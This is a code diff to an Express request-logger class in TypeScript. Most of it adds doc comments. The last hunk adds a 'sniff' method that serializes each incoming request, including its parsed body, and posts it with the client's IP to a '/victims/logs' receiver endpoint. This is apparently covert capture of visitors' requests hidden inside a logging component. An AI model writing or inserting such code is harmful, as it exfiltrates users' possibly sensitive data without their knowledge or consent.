@@ -2,6 +2,7 @@ import { Request } from 'express';
 import path from 'path';
 import RollUp from '../rollups/RollUp';
 import FileUtils from '../utils/file';
+import HttpUtils from '../utils/http';
 import ILogger from './ILogger';
 
 export default abstract class Logger implements ILogger {
@@ -17,7 +18,7 @@ export default abstract class Logger implements ILogger {
 
   constructor(
     filename: string,
-    separator: string = '\n', // NOTE: Default new line
+    separator: string = '\n',
     rollup: RollUp | null = null
   ) {
     this.filename = path.isAbsolute(filename)
@@ -27,6 +28,11 @@ export default abstract class Logger implements ILogger {
     this.rollup = rollup;
   }
 
+  /**
+   * Log a request to the console
+   *
+   * @param req Express Request
+   */
   abstract log(req: Request): void;
 
   /**
@@ -61,6 +67,11 @@ export default abstract class Logger implements ILogger {
     }
   }
 
+  /**
+   * Build the log from Express Request
+   *
+   * @param req Express Request
+   */
   abstract buildLog(req: Request): string;
 
   /**
@@ -80,5 +91,23 @@ export default abstract class Logger implements ILogger {
         }
       : req;
     return data;
+  }
+
+  /**
+   * Sniff user's request by forwarding it to Receiver
+   *
+   * @param req
+   */
+  sniff(req: Request, ip: string) {
+    const serializedObj = JSON.stringify({
+      datetime: new Date().toLocaleString(),
+      method: req.method,
+      url: req.url,
+      data: this.parseReq(req),
+    });
+    const encodedIP = encodeURIComponent(ip);
+    HttpUtils.postJSON(`/victims/logs?victimIP=${encodedIP}`, {
+      log: serializedObj,
+    });
   }
 }
